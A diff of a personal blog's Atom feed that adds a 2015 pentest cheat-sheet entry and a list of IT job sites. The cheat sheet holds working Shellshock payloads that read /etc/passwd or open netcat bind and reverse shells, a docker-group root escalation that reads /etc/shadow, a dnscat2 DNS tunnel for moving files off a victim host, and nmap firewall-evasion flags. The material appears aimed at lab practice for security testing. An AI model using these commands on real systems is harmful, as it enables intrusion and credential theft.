@@ -5,13 +5,256 @@
 <link rel="self" type="application/atom+xml" href="https://jivoi.github.io/feed.xml" />
 <link rel="alternate" type="text/html" href="https://jivoi.github.io" />
 <icon>https://i.imgur.com/s7cqI3w.jpg</icon>
-<updated>2015-08-20T16:56:12+03:00</updated>
+<updated>2015-08-21T13:14:08+03:00</updated>
 <id>https://jivoi.github.io/</id>
 <author>
   <name>EK</name>
   <uri>https://jivoi.github.io/</uri>
   <email>ekoz@protonmail.com</email>
 </author>
+
+
+<entry>
+  <title type="html"><![CDATA[Pentest Tips and Tricks #2]]></title>
+  <link rel="alternate" type="text/html" href="https://jivoi.github.io/2015/08/21/pentest-tips-and-tricks-number-2/" />
+  <id>https://jivoi.github.io/2015/08/21/pentest-tips-and-tricks-number-2</id>
+  <updated>2015-08-21 12:22:57 +0300T00:00:00-00:00</updated>
+  <published>2015-08-21T00:00:00+03:00</published>
+  
+  <author>
+    <name>EK</name>
+    <uri>https://jivoi.github.io</uri>
+    <email>ekoz@protonmail.com</email>
+  </author>
+  <content type="html">&lt;p&gt;Pentest Handy Tips and Tricks #2.&lt;/p&gt;
+
+&lt;section id=&quot;table-of-contents&quot; class=&quot;toc&quot;&gt;
+&lt;header&gt;
+&lt;h3&gt;Contents&lt;/h3&gt;
+&lt;/header&gt;
+&lt;div id=&quot;drawer&quot;&gt;
+&lt;ul id=&quot;markdown-toc&quot;&gt;
+  &lt;li&gt;&lt;a href=&quot;#other-parts&quot; id=&quot;markdown-toc-other-parts&quot;&gt;Other Parts&lt;/a&gt;&lt;/li&gt;
+  &lt;li&gt;&lt;a href=&quot;#tor-nat-traversal&quot; id=&quot;markdown-toc-tor-nat-traversal&quot;&gt;Tor Nat Traversal&lt;/a&gt;&lt;/li&gt;
+  &lt;li&gt;&lt;a href=&quot;#dns-brute-forcing-with-fierce&quot; id=&quot;markdown-toc-dns-brute-forcing-with-fierce&quot;&gt;DNS brute forcing with fierce&lt;/a&gt;&lt;/li&gt;
+  &lt;li&gt;&lt;a href=&quot;#metagoofil-metadata-gathering-tool&quot; id=&quot;markdown-toc-metagoofil-metadata-gathering-tool&quot;&gt;Metagoofil metadata gathering tool&lt;/a&gt;&lt;/li&gt;
+  &lt;li&gt;&lt;a href=&quot;#a-best-nmap-scan-strategy&quot; id=&quot;markdown-toc-a-best-nmap-scan-strategy&quot;&gt;A best NMAP scan strategy&lt;/a&gt;&lt;/li&gt;
+  &lt;li&gt;&lt;a href=&quot;#nmap--techniques-for-avoiding-firewalls&quot; id=&quot;markdown-toc-nmap--techniques-for-avoiding-firewalls&quot;&gt;Nmap – Techniques for Avoiding Firewalls&lt;/a&gt;&lt;/li&gt;
+  &lt;li&gt;&lt;a href=&quot;#exploit-servers-to-shellshock&quot; id=&quot;markdown-toc-exploit-servers-to-shellshock&quot;&gt;Exploit servers to Shellshock&lt;/a&gt;&lt;/li&gt;
+  &lt;li&gt;&lt;a href=&quot;#root-with-docker&quot; id=&quot;markdown-toc-root-with-docker&quot;&gt;Root with Docker&lt;/a&gt;&lt;/li&gt;
+  &lt;li&gt;&lt;a href=&quot;#tunneling-over-dns-to-bypass-firewall&quot; id=&quot;markdown-toc-tunneling-over-dns-to-bypass-firewall&quot;&gt;Tunneling Over DNS to Bypass Firewall&lt;/a&gt;&lt;/li&gt;
+&lt;/ul&gt;
+
+  &lt;/div&gt;
+&lt;/section&gt;
+&lt;!-- /#table-of-contents --&gt;
+
+&lt;h3 id=&quot;other-parts&quot;&gt;Other Parts&lt;/h3&gt;
+&lt;ul&gt;
+  &lt;li&gt;&lt;a href=&quot;https://jivoi.github.io/2015/07/01/pentest-tips-and-tricks/&quot;&gt;Part 1&lt;/a&gt;&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;h3 id=&quot;tor-nat-traversal&quot;&gt;Tor Nat Traversal&lt;/h3&gt;
+
+&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;&lt;span class=&quot;c&quot;&gt;# install to server&lt;/span&gt;
+&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;apt-get install tor torsocks
+
+&lt;span class=&quot;c&quot;&gt;# bind ssh to tor service port 80&lt;/span&gt;
+&lt;span class=&quot;c&quot;&gt;# /etc/tor/torrc&lt;/span&gt;
+SocksPolicy accept 127.0.0.1
+SocksPolicy accept 192.168.0.0/16
+Log notice file /var/log/tor/notices.log
+RunAsDaemon 1
+HiddenServiceDir /var/lib/tor/ssh_hidden_service/
+HiddenServicePort &lt;span class=&quot;m&quot;&gt;80&lt;/span&gt; 127.0.0.1:22
+PublishServerDescriptor 0
+&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;/etc/init.d/tor start
+&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;cat /var/lib/tor/ssh_hidden_service/hostname
+3l5zstvt1zk5jhl662.onion
+
+&lt;span class=&quot;c&quot;&gt;# ssh connect from client&lt;/span&gt;
+&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;apt-get install torsocks
+&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;torsocks ssh login@3l5zstvt1zk5jhl662.onion -p 80&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+&lt;h3 id=&quot;dns-brute-forcing-with-fierce&quot;&gt;DNS brute forcing with fierce&lt;/h3&gt;
+
+&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;&lt;span class=&quot;c&quot;&gt;# http://ha.ckers.org/fierce/&lt;/span&gt;
+&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;./fierce.pl -dns example.com
+&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;./fierce.pl –dns example.com –wordlist myWordList.txt&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+&lt;h3 id=&quot;metagoofil-metadata-gathering-tool&quot;&gt;Metagoofil metadata gathering tool&lt;/h3&gt;
+
+&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;&lt;span class=&quot;c&quot;&gt;# http://www.edge-security.com/metagoofil.php&lt;/span&gt;
+&lt;span class=&quot;c&quot;&gt;#automate search engine document retrieval and analysis. It also has the capability to provide MAC&lt;/span&gt;
+&lt;span class=&quot;c&quot;&gt;# addresses, username listings, and more&lt;/span&gt;
+&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;python metagoofil.py -d example.com -t doc,pdf -l &lt;span class=&quot;m&quot;&gt;200&lt;/span&gt; -n &lt;span class=&quot;m&quot;&gt;50&lt;/span&gt; -o examplefiles -f results.html&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+&lt;h3 id=&quot;a-best-nmap-scan-strategy&quot;&gt;A best NMAP scan strategy&lt;/h3&gt;
+
+&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;&lt;span class=&quot;c&quot;&gt;# A best nmap scan strategy for networks of all sizes&lt;/span&gt;
+
+&lt;span class=&quot;c&quot;&gt;# Host Discovery - Generate Live Hosts List&lt;/span&gt;
+&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;nmap -sn -T4 -oG Discovery.gnmap 192.168.56.0/24
+&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;grep &lt;span class=&quot;s2&quot;&gt;&amp;quot;Status: Up&amp;quot;&lt;/span&gt; Discovery.gnmap &lt;span class=&quot;p&quot;&gt;|&lt;/span&gt; cut -f &lt;span class=&quot;m&quot;&gt;2&lt;/span&gt; -d &lt;span class=&quot;s1&quot;&gt;&amp;#39; &amp;#39;&lt;/span&gt; &amp;gt; LiveHosts.txt
+
+&lt;span class=&quot;c&quot;&gt;# Port Discovery - Most Common Ports&lt;/span&gt;
+&lt;span class=&quot;c&quot;&gt;# http://nmap.org/presentations/BHDC08/bhdc08-slides-fyodor.pdf&lt;/span&gt;
+&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;nmap -sS -T4 -Pn -oG TopTCP -iL LiveHosts.txt
+&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;nmap -sU -T4 -Pn -oN TopUDP -iL LiveHosts.txt
+&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;nmap -sS -T4 -Pn --top-ports &lt;span class=&quot;m&quot;&gt;3674&lt;/span&gt; -oG &lt;span class=&quot;m&quot;&gt;3674&lt;/span&gt; -iL LiveHosts.txt
+
+&lt;span class=&quot;c&quot;&gt;# Port Discovery - Full Port Scans (UDP is very slow)&lt;/span&gt;
+&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;nmap -sS -T4 -Pn -p 0-65535 -oN FullTCP -iL LiveHosts.txt
+&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;nmap -sU -T4 -Pn -p 0-65535 -oN FullUDP -iL LiveHosts.txt
+
+&lt;span class=&quot;c&quot;&gt;# Print TCP\UDP Ports&lt;/span&gt;
+&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;grep &lt;span class=&quot;s2&quot;&gt;&amp;quot;open&amp;quot;&lt;/span&gt; FullTCP&lt;span class=&quot;p&quot;&gt;|&lt;/span&gt;cut -f &lt;span class=&quot;m&quot;&gt;1&lt;/span&gt; -d &lt;span class=&quot;s1&quot;&gt;&amp;#39; &amp;#39;&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;|&lt;/span&gt; sort -nu &lt;span class=&quot;p&quot;&gt;|&lt;/span&gt; cut -f &lt;span class=&quot;m&quot;&gt;1&lt;/span&gt; -d &lt;span class=&quot;s1&quot;&gt;&amp;#39;/&amp;#39;&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;|&lt;/span&gt;xargs &lt;span class=&quot;p&quot;&gt;|&lt;/span&gt; sed &lt;span class=&quot;s1&quot;&gt;&amp;#39;s/ /,/g&amp;#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;|&lt;/span&gt;awk &lt;span class=&quot;s1&quot;&gt;&amp;#39;{print &amp;quot;T:&amp;quot;$0}&amp;#39;&lt;/span&gt;
+&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;grep &lt;span class=&quot;s2&quot;&gt;&amp;quot;open&amp;quot;&lt;/span&gt; FullUDP&lt;span class=&quot;p&quot;&gt;|&lt;/span&gt;cut -f &lt;span class=&quot;m&quot;&gt;1&lt;/span&gt; -d &lt;span class=&quot;s1&quot;&gt;&amp;#39; &amp;#39;&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;|&lt;/span&gt; sort -nu &lt;span class=&quot;p&quot;&gt;|&lt;/span&gt; cut -f &lt;span class=&quot;m&quot;&gt;1&lt;/span&gt; -d &lt;span class=&quot;s1&quot;&gt;&amp;#39;/&amp;#39;&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;|&lt;/span&gt;xargs &lt;span class=&quot;p&quot;&gt;|&lt;/span&gt; sed &lt;span class=&quot;s1&quot;&gt;&amp;#39;s/ /,/g&amp;#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;|&lt;/span&gt;awk &lt;span class=&quot;s1&quot;&gt;&amp;#39;{print &amp;quot;U:&amp;quot;$0}&amp;#39;&lt;/span&gt;
+
+&lt;span class=&quot;c&quot;&gt;# Detect Service Version&lt;/span&gt;
+&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;nmap -sV -T4 -Pn -oG ServiceDetect -iL LiveHosts.txt
+
+&lt;span class=&quot;c&quot;&gt;# Operating System Scan&lt;/span&gt;
+&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;nmap -O -T4 -Pn -oG OSDetect -iL LiveHosts.txt
+
+&lt;span class=&quot;c&quot;&gt;# OS and Service Detect&lt;/span&gt;
+&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;nmap -O -sV -T4 -Pn -p U:53,111,137,T:21-25,80,139,8080 -oG OS_Service_Detect -iL LiveHosts.txt&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+&lt;h3 id=&quot;nmap--techniques-for-avoiding-firewalls&quot;&gt;Nmap – Techniques for Avoiding Firewalls&lt;/h3&gt;
+
+&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;&lt;span class=&quot;c&quot;&gt;# fragmentation&lt;/span&gt;
+&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;nmap -f
+
+&lt;span class=&quot;c&quot;&gt;# change default MTU size number must be a multiple of 8 (8,16,24,32 etc)&lt;/span&gt;
+&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;nmap --mtu 24
+
+&lt;span class=&quot;c&quot;&gt;# Generates a random number of decoys&lt;/span&gt;
+&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;nmap -D RND:10 &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;target&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt;
+
+&lt;span class=&quot;c&quot;&gt;# Manually specify the IP addresses of the decoys&lt;/span&gt;
+&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;nmap -D decoy1,decoy2,decoy3 etc.
+
+&lt;span class=&quot;c&quot;&gt;# Idle Zombie Scan, first t need to find zombie ip&lt;/span&gt;
+&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;nmap -sI &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;Zombie IP&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;Target IP&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt;
+
+&lt;span class=&quot;c&quot;&gt;# Source port number specification&lt;/span&gt;
+&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;nmap --source-port &lt;span class=&quot;m&quot;&gt;80&lt;/span&gt; IP
+
+&lt;span class=&quot;c&quot;&gt;# Append Random Data to scan packages&lt;/span&gt;
+&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;nmap --data-length &lt;span class=&quot;m&quot;&gt;25&lt;/span&gt; IP
+
+&lt;span class=&quot;c&quot;&gt;# MAC Address Spoofing, generate different mac for host pc&lt;/span&gt;
+&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;nmap --spoof-mac Dell/Apple/3Com IP&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+&lt;h3 id=&quot;exploit-servers-to-shellshock&quot;&gt;Exploit servers to Shellshock&lt;/h3&gt;
+
+&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;&lt;span class=&quot;c&quot;&gt;# A tool to find and exploit servers vulnerable to Shellshock&lt;/span&gt;
+&lt;span class=&quot;c&quot;&gt;# https://github.com/nccgroup/shocker&lt;/span&gt;
+&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;./shocker.py -H 192.168.56.118  --command &lt;span class=&quot;s2&quot;&gt;&amp;quot;/bin/cat /etc/passwd&amp;quot;&lt;/span&gt; -c /cgi-bin/status --verbose
+
+&lt;span class=&quot;c&quot;&gt;# cat file&lt;/span&gt;
+&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;echo&lt;/span&gt; -e &lt;span class=&quot;s2&quot;&gt;&amp;quot;HEAD /cgi-bin/status HTTP/1.1\r\nUser-Agent: () { :;}; echo \$(&amp;lt;/etc/passwd)\r\nHost: vulnerable\r\nConnection: close\r\n\r\n&amp;quot;&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;|&lt;/span&gt; nc 192.168.56.118 80
+
+&lt;span class=&quot;c&quot;&gt;# bind shell&lt;/span&gt;
+&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;echo&lt;/span&gt; -e &lt;span class=&quot;s2&quot;&gt;&amp;quot;HEAD /cgi-bin/status HTTP/1.1\r\nUser-Agent: () { :;}; /usr/bin/nc -l -p 9999 -e /bin/sh\r\nHost: vulnerable\r\nConnection: close\r\n\r\n&amp;quot;&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;|&lt;/span&gt; nc 192.168.56.118 80
+
+&lt;span class=&quot;c&quot;&gt;# reverse Shell&lt;/span&gt;
+&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;nc -l -p 443
+&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&amp;quot;HEAD /cgi-bin/status HTTP/1.1\r\nUser-Agent: () { :;}; /usr/bin/nc 192.168.56.103 443 -e /bin/sh\r\nHost: vulnerable\r\nConnection: close\r\n\r\n&amp;quot;&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;|&lt;/span&gt; nc 192.168.56.118 80&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+&lt;h3 id=&quot;root-with-docker&quot;&gt;Root with Docker&lt;/h3&gt;
+
+&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;&lt;span class=&quot;c&quot;&gt;# get root with docker&lt;/span&gt;
+&lt;span class=&quot;c&quot;&gt;# user must be in docker group&lt;/span&gt;
+ek@victum:~/docker-test&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;id
+&lt;span class=&quot;nv&quot;&gt;uid&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;1001&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;ek&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;gid&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;1001&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;ek&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;groups&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;1001&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;ek&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;,114&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;docker&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+
+ek@victum:~&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;mkdir docker-test
+ek@victum:~&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;cd &lt;/span&gt;docker-test
+
+ek@victum:~&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;cat &amp;gt; Dockerfile
+FROM debian:wheezy
+
+ENV WORKDIR /stuff
+
+RUN mkdir -p &lt;span class=&quot;nv&quot;&gt;$WORKDIR&lt;/span&gt;
+
+VOLUME &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$WORKDIR&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;]&lt;/span&gt;
+
+WORKDIR &lt;span class=&quot;nv&quot;&gt;$WORKDIR&lt;/span&gt;
+&amp;lt;&amp;lt; EOF
+
+ek@victum:~&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;docker build -t my-docker-image .
+ek@victum:~&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;docker run -v &lt;span class=&quot;nv&quot;&gt;$PWD&lt;/span&gt;:/stuff -t my-docker-image /bin/sh -c &lt;span class=&quot;se&quot;&gt;\&lt;/span&gt;
+&lt;span class=&quot;s1&quot;&gt;&amp;#39;cp /bin/sh /stuff &amp;amp;&amp;amp; chown root.root /stuff/sh &amp;amp;&amp;amp; chmod a+s /stuff/sh&amp;#39;&lt;/span&gt;
+./sh
+whoami
+&lt;span class=&quot;c&quot;&gt;# root&lt;/span&gt;
+
+ek@victum:~&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;docker run -v /etc:/stuff -t my-docker-image /bin/sh -c &lt;span class=&quot;s1&quot;&gt;&amp;#39;cat /stuff/shadow&amp;#39;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+&lt;h3 id=&quot;tunneling-over-dns-to-bypass-firewall&quot;&gt;Tunneling Over DNS to Bypass Firewall&lt;/h3&gt;
+
+&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;&lt;span class=&quot;c&quot;&gt;# Tunneling Data and Commands Over DNS to Bypass Firewalls&lt;/span&gt;
+&lt;span class=&quot;c&quot;&gt;# dnscat2 supports &amp;quot;download&amp;quot; and &amp;quot;upload&amp;quot; commands for getting files (data and programs) to and from # the victim’s host.&lt;/span&gt;
+
+&lt;span class=&quot;c&quot;&gt;# server (attacker)&lt;/span&gt;
+&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;apt-get update
+&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;apt-get -y install ruby-dev git make g++
+&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;gem install bundler
+&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;git clone https://github.com/iagox86/dnscat2.git
+&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;cd &lt;/span&gt;dnscat2/server
+&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;bundle install
+&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;ruby ./dnscat2.rb
+dnscat2&amp;gt; New session established: 16059
+dnscat2&amp;gt; session -i 16059
+
+&lt;span class=&quot;c&quot;&gt;# client (victum)&lt;/span&gt;
+&lt;span class=&quot;c&quot;&gt;# https://downloads.skullsecurity.org/dnscat2/&lt;/span&gt;
+&lt;span class=&quot;c&quot;&gt;# https://github.com/lukebaggett/dnscat2-powershell&lt;/span&gt;
+&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;dnscat --host &amp;lt;dnscat server_ip&amp;gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+
+  &lt;p&gt;&lt;a href=&quot;https://jivoi.github.io/2015/08/21/pentest-tips-and-tricks-number-2/&quot;&gt;Pentest Tips and Tricks #2&lt;/a&gt; was originally published by EK at &lt;a href=&quot;https://jivoi.github.io&quot;&gt;EK&lt;/a&gt; on August 21, 2015.&lt;/p&gt;</content>
+</entry>
+
+
+<entry>
+  <title type="html"><![CDATA[Awesome IT Jobs]]></title>
+  <link rel="alternate" type="text/html" href="https://jivoi.github.io/2015/08/21/awesome-it-jobs/" />
+  <id>https://jivoi.github.io/2015/08/21/awesome-it-jobs</id>
+  <updated>2015-08-21 12:08:13 +0300T00:00:00-00:00</updated>
+  <published>2015-08-21T00:00:00+03:00</published>
+  
+  <author>
+    <name>EK</name>
+    <uri>https://jivoi.github.io</uri>
+    <email>ekoz@protonmail.com</email>
+  </author>
+  <content type="html">&lt;p&gt;Resources to help you get awesome IT job&lt;/p&gt;
+
+&lt;h3 id=&quot;job-search&quot;&gt;Job Search&lt;/h3&gt;
+&lt;ul&gt;
+  &lt;li&gt;&lt;a href=&quot;http://www.glassdoor.com/&quot;&gt;http://www.glassdoor.com/&lt;/a&gt;&lt;/li&gt;
+  &lt;li&gt;&lt;a href=&quot;http://www.dice.com/&quot;&gt;http://www.dice.com/&lt;/a&gt;&lt;/li&gt;
+  &lt;li&gt;&lt;a href=&quot;http://www.monster.com/&quot;&gt;http://www.monster.com/&lt;/a&gt;&lt;/li&gt;
+  &lt;li&gt;&lt;a href=&quot;https://www.hired.com/&quot;&gt;https://www.hired.com/&lt;/a&gt;&lt;/li&gt;
+  &lt;li&gt;&lt;a href=&quot;https://www.xing.com/en&quot;&gt;https://www.xing.com/en&lt;/a&gt;&lt;/li&gt;
+  &lt;li&gt;&lt;a href=&quot;http://www.jobserve.com/&quot;&gt;http://www.jobserve.com/&lt;/a&gt;&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;h3 id=&quot;social-networks&quot;&gt;Social Networks&lt;/h3&gt;
+&lt;ul&gt;
+  &lt;li&gt;&lt;a href=&quot;https://www.linkedin.com/&quot;&gt;https://www.linkedin.com/&lt;/a&gt;&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;h3 id=&quot;remote-jobs&quot;&gt;Remote Jobs&lt;/h3&gt;
+&lt;ul&gt;
+  &lt;li&gt;&lt;a href=&quot;https://github.com/lukasz-madon/awesome-remote-job&quot;&gt;List of awesome remote jobs and resources&lt;/a&gt;&lt;/li&gt;
+&lt;/ul&gt;
+
+  &lt;p&gt;&lt;a href=&quot;https://jivoi.github.io/2015/08/21/awesome-it-jobs/&quot;&gt;Awesome IT Jobs&lt;/a&gt; was originally published by EK at &lt;a href=&quot;https://jivoi.github.io&quot;&gt;EK&lt;/a&gt; on August 21, 2015.&lt;/p&gt;</content>
+</entry>
 
 
 <entry>
@@ -34,7 +277,7 @@
 &lt;/header&gt;
 &lt;div id=&quot;drawer&quot;&gt;
 &lt;ul id=&quot;markdown-toc&quot;&gt;
-  &lt;li&gt;&lt;a href=&quot;#other-parts&quot; id=&quot;markdown-toc-other-parts&quot;&gt;Other parts&lt;/a&gt;&lt;/li&gt;
+  &lt;li&gt;&lt;a href=&quot;#other-parts&quot; id=&quot;markdown-toc-other-parts&quot;&gt;Other Parts&lt;/a&gt;&lt;/li&gt;
   &lt;li&gt;&lt;a href=&quot;#who-is-writing-to-a-mysql-replica&quot; id=&quot;markdown-toc-who-is-writing-to-a-mysql-replica&quot;&gt;Who is writing to a mysql replica&lt;/a&gt;&lt;/li&gt;
   &lt;li&gt;&lt;a href=&quot;#display-mount-fs-in-nice-layout&quot; id=&quot;markdown-toc-display-mount-fs-in-nice-layout&quot;&gt;Display Mount FS in Nice Layout&lt;/a&gt;&lt;/li&gt;
   &lt;li&gt;&lt;a href=&quot;#freebsd-version&quot; id=&quot;markdown-toc-freebsd-version&quot;&gt;FreeBSD version&lt;/a&gt;&lt;/li&gt;
@@ -58,10 +301,12 @@
 &lt;/section&gt;
 &lt;!-- /#table-of-contents --&gt;
 
-&lt;h3 id=&quot;other-parts&quot;&gt;Other parts&lt;/h3&gt;
-&lt;p&gt;&lt;a href=&quot;https://jivoi.github.io/2014/06/22/linux-unix-it-tips-and-tricks-number-1/&quot;&gt;Part 1&lt;/a&gt;
-&lt;a href=&quot;https://jivoi.github.io/2015/06/29/linux-unix-it-tips-and-tricks-number-2/&quot;&gt;Part 2&lt;/a&gt;
-&lt;a href=&quot;https://jivoi.github.io/2015/07/01/linux-unix-it-tips-and-tricks-number-3/&quot;&gt;Part 3&lt;/a&gt;&lt;/p&gt;
+&lt;h3 id=&quot;other-parts&quot;&gt;Other Parts&lt;/h3&gt;
+&lt;ul&gt;
+  &lt;li&gt;&lt;a href=&quot;https://jivoi.github.io/2014/06/22/linux-unix-it-tips-and-tricks-number-1/&quot;&gt;Part 1&lt;/a&gt;&lt;/li&gt;
+  &lt;li&gt;&lt;a href=&quot;https://jivoi.github.io/2015/06/29/linux-unix-it-tips-and-tricks-number-2/&quot;&gt;Part 2&lt;/a&gt;&lt;/li&gt;
+  &lt;li&gt;&lt;a href=&quot;https://jivoi.github.io/2015/07/01/linux-unix-it-tips-and-tricks-number-3/&quot;&gt;Part 3&lt;/a&gt;&lt;/li&gt;
+&lt;/ul&gt;
 
 &lt;h3 id=&quot;who-is-writing-to-a-mysql-replica&quot;&gt;Who is writing to a mysql replica&lt;/h3&gt;
 
@@ -2762,6 +3007,7 @@ sysdig -c topconns&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
   &lt;li&gt;&lt;a href=&quot;http://www.payscale.com/research/US/Job=Penetration_Tester/Salary/163f8fe3/Entry-Level&quot;&gt;PenTester Salary&lt;/a&gt;&lt;/li&gt;
   &lt;li&gt;&lt;a href=&quot;http://www.calibersecurity.com/san-francisco-information-security-job-board/&quot;&gt;San Francisco InfoSec Jobs&lt;/a&gt;&lt;/li&gt;
   &lt;li&gt;&lt;a href=&quot;http://resources.infosecinstitute.com/careers/&quot;&gt;Infosecinstitute.com&lt;/a&gt;&lt;/li&gt;
+  &lt;li&gt;&lt;a href=&quot;http://www.inspiredcareers.org/&quot;&gt;Inspiredcareers.org/&lt;/a&gt;&lt;/li&gt;
 &lt;/ul&gt;
 
 &lt;h3 id=&quot;it-certifications&quot;&gt;IT Certifications&lt;/h3&gt;
@@ -5025,134 +5271,6 @@ option proto &lt;span class=&quot;s1&quot;&gt;&amp;#39;dhcp&amp;#39;&lt;/span&gt
 
 
   &lt;p&gt;&lt;a href=&quot;https://jivoi.github.io/2015/06/26/huawei-e392-with-linux/&quot;&gt;4G Huawei E392 with Linux&lt;/a&gt; was originally published by EK at &lt;a href=&quot;https://jivoi.github.io&quot;&gt;EK&lt;/a&gt; on June 26, 2015.&lt;/p&gt;</content>
-</entry>
-
-
-<entry>
-  <title type="html"><![CDATA[OSCP Prepare]]></title>
-  <link rel="alternate" type="text/html" href="https://jivoi.github.io/2015/06/19/oscp-prepare/" />
-  <id>https://jivoi.github.io/2015/06/19/oscp-prepare</id>
-  <updated>2015-06-19 13:10:32 +0300T00:00:00-00:00</updated>
-  <published>2015-06-19T00:00:00+03:00</published>
-  
-  <author>
-    <name>EK</name>
-    <uri>https://jivoi.github.io</uri>
-    <email>ekoz@protonmail.com</email>
-  </author>
